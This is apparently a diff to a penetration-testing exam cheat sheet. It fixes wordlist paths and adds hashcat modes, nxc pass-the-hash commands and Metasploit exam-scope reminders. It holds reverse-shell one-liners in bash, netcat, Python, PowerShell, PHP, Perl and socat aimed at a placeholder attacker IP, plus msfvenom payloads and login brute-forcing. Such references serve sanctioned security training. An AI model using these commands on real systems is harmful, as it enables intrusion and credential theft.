@@ -109,7 +109,7 @@ nmap -sV --script vulners --script-args mincvss=7.0 -p- <target>   # only CVSS >
 ### gobuster (dir mode)
 ```bash
 gobuster dir -u http://<target> \
-  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
   -x php,txt,html,bak -t 50 -o gobuster-dir.txt
 
 # Common flags
@@ -172,12 +172,12 @@ ffuf -u http://<target> -H "Host: FUZZ.<domain>" \
 ffuf -u http://<target>/login -X POST \
   -d "username=admin&password=FUZZ" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top1000.txt \
+  -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
   -fc 401
 
 # Common flags
 -u    URL with FUZZ keyword
--w    wordlist (can prefix KEYWORD: for multiple)
+-w    wordlist (append :KEYWORD, e.g. -w list1.txt:FUZZ1 -w list2.txt:FUZZ2, for multiple simultaneous wordlists)
 -X    HTTP method
 -d    POST data
 -H    header
@@ -195,8 +195,8 @@ ffuf -u http://<target>/login -X POST \
 ### Directories / files (web content)
 ```
 /usr/share/seclists/Discovery/Web-Content/common.txt
-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 /usr/share/seclists/Discovery/Web-Content/big.txt
@@ -219,16 +219,17 @@ ffuf -u http://<target>/login -X POST \
 
 ### Passwords
 ```
-/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top1000.txt
+/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt
 /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-/usr/share/seclists/Passwords/Common-Credentials/probable-v2-top1575.txt
+/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt
 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
 ```
 
 ### SNMP / Common misc
 ```
 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+/usr/share/seclists/Discovery/SNMP/snmp.txt
 /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
 ```
 
@@ -270,6 +271,8 @@ gunzip /usr/share/wordlists/rockyou.txt.gz    # extracts to /usr/share/wordlists
 | Django (PBKDF2-SHA256)               | 10000     | |
 | Oracle 11g                           | 112       | |
 | Wordpress (phpass)                   | 400       | |
+| JWT (HS256)                          | 16500     | crack the HMAC secret of a JSON Web Token |
+| KeePass 1/2 (.kdbx)                  | 13400     | via keepass2john |
 
 ### `-a` Attack Mode Primer
 ```
@@ -305,9 +308,17 @@ hashcat -m 1000 hashes.txt --show
 hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d
 ```
 
+**Faster (nxc):** once a hash cracks (or even without cracking, for pass-the-hash), validate it directly against the target instead of hand-testing logins:
+```bash
+nxc smb <target_or_range> -u <user> -p <cracked_password>
+nxc smb <target_or_range> -u <user> -H <ntlm_hash>   # pass-the-hash, no cracking needed
+```
+
 ---
 
 ## 5. msfvenom Payload Generation
+
+**Exam scope reminder:** Metasploit/Meterpreter (including msfvenom-generated `meterpreter` payloads and `msf` exploit modules) may be used against only ONE non-AD exam machine for the whole exam, and never for pivoting. Prefer the non-meterpreter `shell_reverse_tcp`/`cmd` payloads below for everything else.
 
 ### Windows reverse shell (EXE)
 ```bash
@@ -331,6 +342,7 @@ msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=443 -f raw -o shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp -o shell.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx -o shell.aspx
 ```
+- If the target IIS app pool is 64-bit only (`Enable 32-Bit Applications` = False), the x86 payload above fails to load — use `windows/x64/meterpreter/reverse_tcp` (or `windows/x64/shell_reverse_tcp`) instead.
 
 ### JSP / WAR (Tomcat)
 ```bash
@@ -373,15 +385,26 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
 | **Bash** | `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1` |
 | **Bash (alt)** | `0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196` |
 | **Netcat (classic)** | `nc -e /bin/sh <attacker_ip> <port>` |
-| **Netcat (no -e)** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <attacker_ip> <port> >/tmp/f` |
+| **Netcat (no -e)** | contains a `\|` pipe — see fenced block below (table cells can't hold a literal `\|` safely) |
 | **Netcat (traditional/GNU, -e)** | `nc.traditional -e /bin/sh <attacker_ip> <port>` (OpenBSD `nc`, the Kali/Debian default, strips `-e`/`-c` execution support — use `nc.traditional` or `ncat --exec /bin/sh <attacker_ip> <port>` instead) |
 | **Python3** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` |
-| **PowerShell** | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` |
+| **PowerShell** | contains `\|` pipes — see fenced block below (table cells can't hold a literal `\|` safely) |
 | **PHP** | `php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` |
 | **Perl** | `perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
 | **socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>` |
 | **Listener (attacker)** | `nc -lvnp <port>` |
 | **Listener (rlwrap, stable)** | `rlwrap nc -lvnp <port>` |
+| **Listener (socat, full PTY)** | `socat file:$(tty),raw,echo=0 tcp-listen:<port>` — pair with the socat payload above to keep raw-tty/job-control instead of a bare shell |
+
+Commands with literal pipes, kept out of the table above (raw markdown escapes `\|` for GFM table cells — paste from these fenced blocks, not the table, to avoid copying stray backslashes):
+```bash
+# Netcat (no -e), mkfifo named-pipe shell
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
+```
+```powershell
+# PowerShell TCP reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
 ### Shell stabilization (after landing on Linux target)
 ```bash
@@ -409,9 +432,9 @@ Once `nmap -sV` (or banner grabbing) gives you a product and version string, fee
 | [cvedetails.com version search](https://www.cvedetails.com/version-search.php) | Web | Vendor / product / version dropdowns | Best when you know exact vendor+product; supports one trailing wildcard (e.g. `4.7*`); results cap at 100 per query so add the version to narrow a popular product |
 | [NVD search](https://nvd.nist.gov/vuln/search) | Web + API | Keyword search, e.g. `vsftpd 2.3.4` | Authoritative CVE descriptions/CVSS/CPE; slower to update with exploit links than vulners/Exploit-DB |
 | [sploitus.com](https://sploitus.com/) | Web | `apache struts 2.3` | Search engine over Exploit-DB, Metasploit, GitHub PoC repos, and Packet Storm in one query |
-| [Rapid7 Vulnerability & Exploit DB](https://www.rapid7.com/db/) | Web | `<product> <version>` search box | Cross-links matching Metasploit module names directly — useful to jump straight to `msfconsole` |
+| [Rapid7 Vulnerability & Exploit DB](https://www.rapid7.com/db/) | Web | `<product> <version>` search box | Cross-links matching Metasploit module names directly — useful to jump straight to `msfconsole` (remember the one-machine, non-AD, no-pivoting Metasploit exam limit before firing the module) |
 | [Packet Storm Security](https://packetstormsecurity.com/search/?q=) | Web | `<product> <version>` | Good secondary source when Exploit-DB has no PoC for a niche CVE |
-| `msf > search` (Metasploit) | CLI | `search type:exploit name:wordpress` or `search cve:2021-41773` | Cross-check once you have a candidate CVE — confirms whether a ready module exists before hand-rolling a PoC |
+| `msf > search` (Metasploit) | CLI | `search type:exploit name:wordpress` or `search cve:2021-41773` | Cross-check once you have a candidate CVE — confirms whether a ready module exists before hand-rolling a PoC; actually running an exploit module still counts against the one-machine Metasploit exam limit |
 | [GitHub Advisory DB](https://github.com/advisories) | Web | Filter by ecosystem + package name/version | Best for app-level library CVEs (npm/pip/composer/gem packages) rather than network services |
 
 **Workflow tip:** run `searchsploit <product> <version>` first (fast, offline, works without exam network egress concerns), then confirm/deepen with `vulners.com` or `nvd.nist.gov` if searchsploit comes up empty or you need the full CVE writeup for the exam report.
